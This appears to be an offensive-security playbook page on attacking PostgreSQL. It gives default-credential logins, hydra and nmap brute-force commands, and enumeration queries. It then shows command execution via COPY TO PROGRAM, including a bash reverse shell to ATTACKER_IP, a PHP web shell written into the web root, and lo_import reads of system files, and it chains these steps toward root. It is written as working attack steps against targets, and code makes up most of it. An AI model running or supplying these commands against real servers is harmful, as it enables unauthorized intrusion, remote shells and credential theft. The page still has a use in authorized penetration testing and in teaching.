---
id: postgresql-enum
title: PostgreSQL Enumeration
stage: enumeration
tags: [windows, linux]
summary: Connect to PostgreSQL and escalate to OS command execution via COPY TO PROGRAM — superuser access (common on default installs) is all it takes.
leads_to:
  - sqli-rce
  - rev-shell
  - public-exploit
---

## Prerequisites

Port 5432 open (sometimes 5433). The `postgres` superuser with no password or a weak password is the most common entry point.

PostgreSQL's `COPY TO PROGRAM` feature allows superusers to execute arbitrary OS commands, making it one of the cleanest SQL-to-RCE paths available. The `postgres` OS user on Linux almost always has passwordless sudo or sudo rules — getting a shell as the service account frequently means an immediate path to root.

## Quick Win

> Try postgres superuser with no password — works on a surprising number of default installs.

```bash
psql -h $TARGET -U postgres
PGPASSWORD=postgres psql -h $TARGET -U postgres
```

## Brute Force (if no anonymous access)

> PostgreSQL doesn't lock accounts by default — brute force is safe.

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt postgres://$TARGET
```

```bash
nmap -p5432 --script pgsql-brute $TARGET
```

## Enumerate Once Connected

> Identify role, databases, and whether you're a superuser.

```sql
SELECT current_user;
SELECT version();
SELECT rolname, rolsuper FROM pg_roles;                    -- identify superusers
SELECT current_setting('is_superuser');                    -- am I superuser?
\l                                                          -- list databases
\c dbname                                                  -- switch database
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

## RCE via COPY TO PROGRAM (Superuser Required)

> Executes OS commands as the postgres service account — SeImpersonate equivalent on Linux.

```sql
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';
```

## Write Web Shell (if web root is known)

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

## File Read (Any Authenticated User)

> Read arbitrary files as the postgres OS user — no superuser needed.

```sql
SELECT lo_import('/etc/passwd');    -- returns OID
SELECT lo_get(<OID>);
```

## Leads To

Superuser + `COPY TO PROGRAM` → rev-shell as postgres service account → check `sudo -l` (postgres OS user often has passwordless sudo). Web shell written → rev-shell via web. File read reveals SSH keys or credentials → ssh-access or password-spray. Non-superuser → `lo_import` for file read → look for keys and configs.
